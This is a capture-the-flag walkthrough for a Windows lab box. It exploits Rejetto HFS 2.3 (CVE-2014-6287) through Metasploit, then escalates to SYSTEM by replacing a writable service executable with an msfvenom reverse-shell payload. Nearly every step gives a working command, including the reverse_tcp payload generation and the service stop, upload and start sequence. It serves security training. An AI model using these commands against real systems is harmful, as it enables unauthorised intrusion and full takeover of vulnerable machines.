1. Check nmap > Ports 80, 135, 139, 445, 3389, and 8080 (Rejetto Http File Server) are open.
2. Seeing the port 80 open, we can say it must be a website. Visiting the website, we get an image which states that the person is the
   "Employee of the month". From the source page of the website, we find that this is the image of "Bill Harper".
3. From nmap, we found that HFS 2.3 is running on port 8080. ExploitDB gives us the exploit CVE-2014-6287. Let's search for this exploit
   on msfconsole and we got 1 entry which has excellent ranking. Using this exploit, we got a meterpreter shell. The user flag is
   located in side the c:\Users\bill\Desktop directory.
4. To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and
   determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on
   misconfigurations." Script link: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
   Upload the script using the "upload PowerUp.ps1" command inside meterpreter session. Load powershell inside the meterpreter session
   and enter powershell by running the "powershell_shell" command.
5. Run the script using the following commands.
   > . .\PowerUp.ps1
   > Invoke-AllChecks
   Service AdvancedSystemCareService9 has CanRestart option set to true, which allows us to restart a service on the system. It has
   Unquoted Service Paths vulnerability. The executable file name is ASCService.exe and it is writable.
6. Let's use msfvenom to generate a reverse shell as an Windows executable.
   > msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe
   Now in a new msfconsole, use the Multi Handler to receive the incoming connection. Now, in the previous meterpreter session, to
   upload the binary and replace the legitimate one, follow the below process.
   > shell
   > sc stop AdvancedSystemCareService9
   > Ctrl + C
   > upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
   > shell
   > sc start AdvancedSystemCareService9
   > Ctrl + C
   > migrate [pid]
7. Now, we have got a stable root privilege. The root flag is located in side the c:\Users\Administrator\Desktop directory.
